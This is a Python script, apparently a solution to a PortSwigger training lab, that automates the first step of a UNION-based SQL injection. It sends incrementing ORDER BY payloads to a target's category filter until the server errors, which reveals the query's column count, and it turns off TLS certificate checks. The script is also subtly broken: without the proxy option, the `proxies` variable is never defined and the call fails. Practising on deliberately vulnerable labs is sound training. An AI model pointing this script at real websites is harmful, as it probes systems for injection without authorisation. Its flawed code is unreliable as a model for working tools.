#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_lab_03(url, proxies=None):
    path = "filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i
        r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i-1
        i = i+1
    return False

if __name__ == "__main__":
    parser=argparse.ArgumentParser(description="SQL injection UNION attack, determining the number of columns returned by the query - https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com/)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }

    print("SQL injection UNION attack, determining the number of columns returned by the query - https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns\n")

    print("[*] Figuring out number of columns...")
    num_col = sqli_lab_03(args.url.strip(), proxies)
    if num_col:
        print("[V] The number of columns is "+ str(num_col)+".")
    else:
        print("[X] SQL Injection Not Successfull!")